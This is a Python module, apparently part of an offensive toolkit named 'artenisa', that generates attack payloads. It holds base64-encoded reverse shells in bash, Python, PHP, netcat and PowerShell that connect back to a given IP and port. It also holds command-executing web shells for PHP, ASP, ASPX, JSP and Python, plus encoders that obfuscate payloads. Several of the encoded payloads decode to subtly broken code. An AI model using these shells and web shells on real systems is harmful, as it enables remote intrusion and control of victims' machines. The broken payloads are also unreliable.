import base64
import logging
from urllib.parse import quote

log = logging.getLogger("artenisa.payloads")

REVERSE_SHELLS = {
    "bash": "YmFzaCAtaSA+JiAvZGV2L3RjcC97aXB9L3twb3J0fSAwPiYx",
    "python": "aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoJ3tpcH0nLHtwb3J0fSkpO29zLmR1cDIocy5maWxlbm8oKSwwKTtvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO3N1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKQ==",
    "php": "JHNuID0gZnNvY2tvcGVuKCJ7aXB9Iiwge3BvcnR9KTsgd2hpbGUoISRwID0gZmVvZigkc24sIDUxMikpIHsgZXhlYygkcCk7IH0gZmNsb3NlKCRzbik7",
    "nc": "bmMgLWVzIC9iaW4vc2gge2lwfSB7cG9ydH0=",
    "powershell": "JGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudCgne2lwfScse3BvcnR9KTskc3RyZWFtID0gJGNsaWVudC5HZXRTdHJlYW0oKTtbYnl0ZVtdXSRieXRlcyA9IDAuLlN0cmVhbVJlYWRUaW1lb3V0XXswfTsoKCRpID0gJHN0cmVhbS5SZWFkKCRieXRlcywgMCwgMTAyNCkpIC1ndCAwKXskZGF0YSA9IChOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5BU0NJaUVuY29kaW5nKS5HZXRTdHJpbmcoJGJ5dGVzLDAsICRpKTskcmVzdWx0ID0gKGlleCgkZGF0YSAyPiYxIHwgT3V0LVN0cmluZyApKTskc2VuZGJhY2sgPSAoJHJlc3VsdCArICdQUyAnICsgKHAuZ2V0X2xvY2F0aW9uKCkuUGF0aCArICc+ICcpO1skc2VuZHdpZHRoID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6QVNDSUkuR2V0Qnl0ZXMoJHNlbmRiYWNrKV0kYnVmZmVyID0gW1N5c3RlbS5Db252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoJHNlbmR3aWR0aCl9JGNsaWVudC5DbG9zZSgp",
}

WEBSHELLS = {
    "php": "PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+",
    "asp": "PCUgb2JqLlJ1bihSZXF1ZXN0Lkl0ZW1bImNtZCJdKSA+Pg==",
    "aspx": "PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiAlPjwlJSBTdHJpbmcgY21kID0gUmVxdWVzdC5RdWVyeVN0cmluZ1siY21kIl07IGlmIChjbWQgIT0gbnVsbCkgeyBTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2Vzcy5TdGFydChjbWQpOyB9ICU+",
    "jsp": "PCUgQHRhZyBwYWdlIGltcG9ydD0iamF2YS5pby4qIiAlPjwlIFN0cmluZyBjbWQgPSByZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIik7IGlmIChjbWQgIT0gbnVsbCkgeyBQcm9jZXNzIHByb2Nlc3MgPSBSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKGNtZCk7IGJ1ZmZlcmVkUmVhZGVyIGJyID0gbmV3IEJ1ZmZlcmVkUmVhZGVyKG5ldyBJbnB1dFN0cmVhbVJlYWRlcihwcm9jZXNzLmdldElucHV0U3RyZWFtKCkpKTsgU3RyaW5nIGxpbmU7IHdoaWxlICgobGluZSA9IGJyLnJlYWRMaW5lKCkpICE9IG51bGwpIHsgb3V0LnByaW50bG4obGluZSk7IH0gfSAlPg==",
    "py": "IyEvdXNyL2Jpbi9weXRob24zDQppbXBvcnQgY2dpcCwgb3MsIHN5cw0KY21kID0gY2dpcC5HZXRlbnYoImNvbW1hbmQiLCAiIikNCmlmIGNtZDoNCiAgICBvcy5zeXN0ZW0oY21kKQ0K",
}


def reverse_shell(ip: str, port: int, shell_type: str = "bash") -> dict:
    shell_type = shell_type.lower()
    encoded = REVERSE_SHELLS.get(shell_type)
    if not encoded:
        return {"error": f"Shell type '{shell_type}' no soportado. Opciones: {list(REVERSE_SHELLS.keys())}"}
    try:
        decoded = base64.b64decode(encoded).decode("utf-8")
        decoded = decoded.replace("{ip}", ip).replace("{port}", str(port))
        return {
            "type": shell_type,
            "decoded": decoded,
            "encoded": base64.b64encode(decoded.encode()).decode(),
        }
    except Exception as e:
        return {"error": str(e)}


def webshell(lang: str = "php") -> dict:
    lang = lang.lower()
    encoded = WEBSHELLS.get(lang)
    if not encoded:
        return {"error": f"Webshell '{lang}' no soportada. Opciones: {list(WEBSHELLS.keys())}"}
    try:
        decoded = base64.b64decode(encoded).decode("utf-8")
        return {
            "language": lang,
            "decoded": decoded,
            "encoded": encoded,
        }
    except Exception as e:
        return {"error": str(e)}


def encode_payload(payload: str, method: str = "b64") -> dict:
    methods = {
        "b64": lambda p: base64.b64encode(p.encode()).decode(),
        "hex": lambda p: p.encode().hex(),
        "url": lambda p: quote(p),
        "unicode": lambda p: "".join(f"\\u{ord(c):04x}" for c in p),
    }
    encoder = methods.get(method)
    if not encoder:
        return {"error": f"Método '{method}' no soportado. Opciones: {list(methods.keys())}"}
    try:
        return {
            "method": method,
            "original": payload,
            "encoded": encoder(payload),
        }
    except Exception as e:
        return {"error": str(e)}
